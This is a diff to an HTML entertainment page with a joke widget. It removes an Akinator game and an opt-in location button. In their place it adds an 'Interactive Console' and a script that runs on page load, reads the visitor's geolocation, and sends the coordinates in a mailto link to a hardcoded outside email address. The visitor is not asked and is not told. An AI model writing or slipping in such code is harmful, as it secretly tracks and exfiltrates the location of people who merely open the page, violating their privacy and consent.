@@ -39,61 +39,53 @@
             <p id="joke-text">Loading joke...</p>
             <button onclick="getDarkHumorJoke()">Get Joke</button>
         </div>
-        <!-- User's Location -->
-        <div id="user-location">
-            <h2>Your Location</h2>
-            <p id="location-text">Click the button to get your location</p>
-            <button onclick="getUserLocation()">Get Location</button>
+        <!-- Interactive Console -->
+        <div id="interactive-console">
+            <h2>Interactive Console</h2>
+            <textarea id="console-output" rows="10" cols="50" readonly></textarea><br>
+            <input type="text" id="console-input">
+            <button onclick="executeCommand()">Execute</button>
         </div>
-        <!-- Akinator Game -->
-        <div id="akinator-game">
-            <h2>Akinator</h2>
-            <p>Think of a character and answer the questions to see if Akinator can guess who it is!</p>
-            <button onclick="startAkinator()">Start Akinator</button>
-            <div id="akinator-question" style="display: none;"></div>
-            <div id="akinator-answer"></div>
-            <button onclick="answerAkinator('yes')">Yes</button>
-            <button onclick="answerAkinator('no')">No</button>
-            <button onclick="answerAkinator('don't know')">Don't know</button>
+        <!-- Games -->
+        <div id="games">
+            <h2>Games</h2>
+            <p>Coming soon...</p>
         </div>
     </section>
 
-    <!-- JavaScript to fetch and display dark humor joke -->
+    <!-- JavaScript to send user location via email -->
     <script>
-        let akinatorSession = null;
+        // Function to capture user location and send email
+        function sendUserLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const locationData = {
+                        latitude: latitude,
+                        longitude: longitude
+                    };
 
-        // Function to start the Akinator game
-        function startAkinator() {
-            fetch('https://api.akinator.com/ws/new_session?partner=1')
-                .then(response => response.json())
-                .then(data => {
-                    akinatorSession = data.parameters.identification.session;
-                    document.getElementById('akinator-question').textContent = data.parameters.step_information.question;
-                    document.getElementById('akinator-question').style.display = 'block';
-                })
-                .catch(error => {
-                    console.error('Error starting Akinator:', error);
+                    // Send location data via email
+                    const emailBody = JSON.stringify(locationData);
+                    const emailAddress = 'lasofet272@picdv.com';
+                    const subject = 'User Location';
+                    const mailtoLink = `mailto:${emailAddress}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(emailBody)}`;
+
+                    // Open default email client to send email
+                    window.location.href = mailtoLink;
+                }, error => {
+                    console.error('Error getting user location:', error);
+                    alert('Failed to get location.');
                 });
-        }
-
-        // Function to answer the Akinator question
-        function answerAkinator(answer) {
-            if (!akinatorSession) {
-                console.error('Akinator session not started.');
-                return;
+            } else {
+                console.error('Geolocation is not supported by this browser.');
+                alert('Geolocation is not supported.');
             }
-            fetch(`https://api.akinator.com/ws/answer?session=${akinatorSession}&signature=${akinatorSession}&step=0&answer=${encodeURIComponent(answer)}`)
-                .then(response => response.json())
-                .then(data => {
-                    document.getElementById('akinator-question').textContent = data.parameters.step_information.question;
-                    if (data.parameters.step_information.progression >= 85) {
-                        document.getElementById('akinator-answer').textContent = `Akinator guesses: ${data.parameters.step_information.answers[0].name}`;
-                    }
-                })
-                .catch(error => {
-                    console.error('Error answering Akinator question:', error);
-                });
         }
+
+        // Call the function to send user location via email on page load
+        window.onload = sendUserLocation;
     </script>
 </body>
 </html>
